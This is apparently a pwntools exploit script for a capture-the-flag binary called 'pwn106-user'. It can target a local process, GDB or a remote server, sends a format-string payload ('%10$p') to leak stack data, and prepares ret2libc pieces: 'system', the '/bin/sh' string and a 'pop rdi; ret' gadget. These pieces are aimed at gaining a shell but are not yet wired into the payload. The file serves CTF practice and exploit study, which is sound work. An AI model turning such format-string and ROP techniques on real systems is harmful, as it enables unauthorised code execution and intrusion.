from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

format_offset = 10 #found manually by increasing %2$p

# Set up pwntools for the correct architecture
exe = './pwn106user.pwn106-user'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
address_libc_start_main = libc.symbols['__libc_start_main']
address_system_libc     = libc.symbols['system']
STR_binsh = next(libc.search(b'/bin/sh'))

#A ROP-gagdet which do something like pop rdi; ret.
rop = ROP(libc)
gadget_pop = rop.find_gadget(['pop rdi', 'ret'])
ROP_pop_rdi_ret = gadget_pop.address


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

payload = flat(
        '%10$p'
)
# Save the payload to file
write('payload1', payload)

# Send the payload
io.sendline(payload)

# Receive the flag
io.interactive()
